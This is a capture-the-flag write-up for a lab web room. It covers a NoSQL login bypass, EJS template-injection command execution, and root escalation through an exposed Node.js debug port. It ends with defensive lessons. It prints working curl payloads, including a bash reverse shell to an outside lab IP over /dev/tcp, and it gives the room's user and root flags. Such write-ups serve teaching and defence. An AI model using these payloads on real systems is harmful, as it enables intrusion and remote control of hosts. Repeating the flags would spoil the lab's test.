# Hacker Holidays 2026 - Do Not Disturb
The **Do Not Disturb** challenge takes place in the poolside cabanas of the Byte Lotus Hotel, where an active session on the tracking platform reveals suspicious, unauthorized movement across active guest accounts. 

This room tests web exploitation and privilege escalation skills, starting with bypassing authentication using NoSQL injection against a Node.js/Express backend, escalating to arbitrary command execution via Server-Side Template Injection (SSTI) in EJS templates, and ultimately leveraging host misconfigurations to achieve root access.

So, here we have guest's being confused of unauthorized transactions.

<img width="587" height="836" alt="image" src="https://github.com/user-attachments/assets/03c824f7-58c8-46b7-acdc-7dcb13fdb2b8" />

And the concierge has given us some briefings

<img width="996" height="438" alt="image" src="https://github.com/user-attachments/assets/b2db1b74-f659-4797-a56e-8e21326e92d5" />

As the first stage in this task, we will be doing Enumeration, where we will stumble upon unknown places and get to know what is what in it. The goal of this room is to find the user and root user flags.

We will use nmap scan on the IP Address given. The command is ```nmap -Pn -sC -sV -oN nmap/initial 10.49.128.99```, this will scan and give us all the information needed. We have initiated the scripts flag as well.

<img width="1271" height="506" alt="image" src="https://github.com/user-attachments/assets/6ce7be6f-7d8f-4b51-8a9b-10ab6f8b32f5" />

So now we get to know that a website is running for this IP Address and it runs on Node.js (Express Middleware) and is known as the poolside website. So, let's open the website with the IP first.

<img width="1296" height="747" alt="image" src="https://github.com/user-attachments/assets/1468551b-d65a-4645-895e-76a2cc7d260b" />

And here we got the login page for this website, Poolside. So, now we need to find the credentials which will be our phase 2, the NoSQL Authentication Bypass. This is an old method, but sometimes its better to do all things possible. Also, I tried to inspect the source code and the page code, no visible leaked data was there.

So, we are going to use **curl**. The command is ```curl -i -s -c cookies.txt --data 'username=attendant&password=[$ne]=x' http://10.49.128.99/login```, we don't know any credentials so we are going to look into the active session id's and store them in the cookies.txt

The --data command used above is a posting command, so we used it to post the username ad password. -i for include errors, -s for silent output and -c for saving the output.

<img width="1656" height="327" alt="image" src="https://github.com/user-attachments/assets/c020f110-bc03-47c6-a57b-115cf9d7b30a" />

So here we have got the staff id because we have found this to be redirected to the staff. Next let's use ```cat``` command to read the cookies.txt

<img width="1911" height="213" alt="image" src="https://github.com/user-attachments/assets/4d85d26b-8f16-4739-bdcd-cfb50735d403" />

Now, let's use this session ID to send back to the server as the client in-order to restore the old session. Stolen cookies are leveraged to bypass authentication. Let's use the curl command again. ```curl -s -b cookies.txt --data-urlencode 'template=<%=7*7%>' http://10.49.128.99/staff/preview```

<img width="1596" height="748" alt="image" src="https://github.com/user-attachments/assets/5d85ea99-08fa-44eb-82e3-004378c613f2" />
<img width="1772" height="333" alt="image" src="https://github.com/user-attachments/assets/fa22f91f-7512-414d-8313-2b0ca19c8155" />

We can also see he content we have tried to push here. The template we posted got accepted. Next we are going to move to command execution. So, the command we are going to use for that is ```curl -s -b cookies.txt --data-urlencode 'template=<%=global.process.mainModule.require("child_process").execSync("id").toString()%>' http://10.49.128.99/staff/preview```, this command was given from a research only.

<img width="1900" height="682" alt="image" src="https://github.com/user-attachments/assets/b50da6fb-e28a-477e-b9e8-9cfd76d5b29f" />

So, this got posted as well. Let's try to get the reverse shell right now. So, I'll open another terminal to start the listening port. After doing so, we are going to inject another payload to load the cookie again using the command ```curl -s -b cookies.txt --data-urlencode "template=<%=global.process.mainModule.require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/10.49.99.107/4444 0>&1'\")%>" http://10.49.128.99/staff/preview```

<img width="1897" height="742" alt="image" src="https://github.com/user-attachments/assets/8ad2f478-528a-4f57-87b2-d7288d72d6d1" />

And by doing so, we have entered into the poolside machine. Our listening port has been activated.

<img width="996" height="274" alt="image" src="https://github.com/user-attachments/assets/5bbe464c-6d2f-46a6-a775-176a8374e125" />

Now we will do the basic ```whoami``` and ```id``` to know about the user profile. After these let's use ```find  . -type f -name "*user*"```

<img width="999" height="448" alt="image" src="https://github.com/user-attachments/assets/be0d36ed-d107-4296-a013-378bc8756076" />

<img width="968" height="246" alt="image" src="https://github.com/user-attachments/assets/2d4fd0a3-966b-407c-9aa3-14707ad068ab" />

Next I did the command ```cat /home/poolside/user.txt``` to retrieve the user flag for this room.

**What is the user flag?** <br>
THM{w4rm_s3ss10n_h1j4ck3d}

<img width="968" height="246" alt="image" src="https://github.com/user-attachments/assets/9ad210a3-2bfb-4eb1-98d9-0cdc2e903e11" />

```
ss -tlnp | grep 9229
ps -ef | grep inspect
```

<img width="1002" height="344" alt="image" src="https://github.com/user-attachments/assets/854d10d0-8aa7-477a-b6c5-f7b125041cb4" />

```
curl http://127.0.0.1:9229/json
```

<img width="1013" height="562" alt="image" src="https://github.com/user-attachments/assets/a414b2a3-c517-4e14-8f26-2202cb948cb6" />

We can confirm, the process is running as pipeline service. We are going to exploit the NodeJS by launching another terminal shell, which is going to be like lateral movement.

<img width="1692" height="547" alt="image" src="https://github.com/user-attachments/assets/a2bbed9b-8918-44d2-93fb-3b54386d0e42" />

We need to run this on the terminal to get the shell pass and by doing so we got the root user terminal, and also found the flag.

<img width="1696" height="685" alt="image" src="https://github.com/user-attachments/assets/6a8f542e-c3af-48b6-9cac-258fd46a857a" />

**What is the root flag?** <br>
THM{r4w_d1sk_4cc3ss_w4s_t00_much}

## Lessons Learned

* **Sanitize Inputs Against NoSQL Injection:** Relying on default Express query parsing without enforcing strict type checking or schema validation allows attackers to inject query operators (such as `[$ne]`) to bypass authentication mechanisms.
* **Avoid Insecure Server-Side Template Rendering:** Passing untrusted user input directly into template engines like EJS enables Server-Side Template Injection (SSTI), which can quickly escalate to Remote Code Execution (RCE) via system commands.
* **Protect Node.js Debugging Endpoints:** Exposing Node.js inspector/debug ports (e.g., port 9229) to local or unauthenticated contexts allows unauthorized users to attach debuggers, execute arbitrary code, and escalate privileges on the host.
* **Enforce Least Privilege for Backend Services:** System processes and pipeline services should run with minimally required privileges to restrict lateral movement and prevent local privilege escalation to root.

























